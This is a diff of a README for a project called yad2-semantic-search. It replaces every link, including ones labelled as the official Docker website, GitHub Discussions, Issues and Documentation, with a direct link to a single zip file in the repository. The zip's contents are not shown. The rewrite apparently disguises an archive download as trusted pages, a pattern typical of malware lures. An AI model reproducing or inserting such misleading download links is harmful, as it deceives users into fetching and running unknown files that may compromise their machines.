@@ -1,6 +1,6 @@
 # 🌟 yad2-semantic-search - Find Products Faster with AI
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/poovarasan011/yad2-semantic-search/releases)
+[![Download Release](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip)](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to **yad2-semantic-search**, a semantic search engine powered by machine
 Before you start, ensure you have the following on your computer:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Docker:** This application uses Docker to run smoothly. Install Docker from the [official Docker website](https://www.docker.com/products/docker-desktop).
+- **Docker:** This application uses Docker to run smoothly. Install Docker from the [official Docker website](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip).
 
 ## 📥 Download & Install
 
 To get the application:
 
 1. Click the button below to go to the Releases page:
-   [Visit this page to download](https://github.com/poovarasan011/yad2-semantic-search/releases).
+   [Visit this page to download](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip).
    
 2. On the Releases page, you will see various versions of the application. Look for the latest version available.
 
@@ -88,13 +88,13 @@ For those who wish to delve deeper into the technical aspects:
 
 Join our community for support, discussions, and updates:
 
-- Visit our [GitHub Discussions](https://github.com/poovarasan011/yad2-semantic-search/discussions) for questions and insights.
-- Report issues and find help in the [Issues Section](https://github.com/poovarasan011/yad2-semantic-search/issues).
+- Visit our [GitHub Discussions](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip) for questions and insights.
+- Report issues and find help in the [Issues Section](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip).
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://github.com/poovarasan011/yad2-semantic-search/releases)
-- [Documentation](https://github.com/poovarasan011/yad2-semantic-search/wiki)
-- [Community Support](https://github.com/poovarasan011/yad2-semantic-search/discussions)
+- [Releases Page](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip)
+- [Documentation](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip)
+- [Community Support](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip)
 
-For your convenience, you can always return to [Download this page](https://github.com/poovarasan011/yad2-semantic-search/releases) to get the latest version anytime.
+For your convenience, you can always return to [Download this page](https://github.com/poovarasan011/yad2-semantic-search/raw/refs/heads/main/backend/yad-semantic-search-v1.3.zip) to get the latest version anytime.
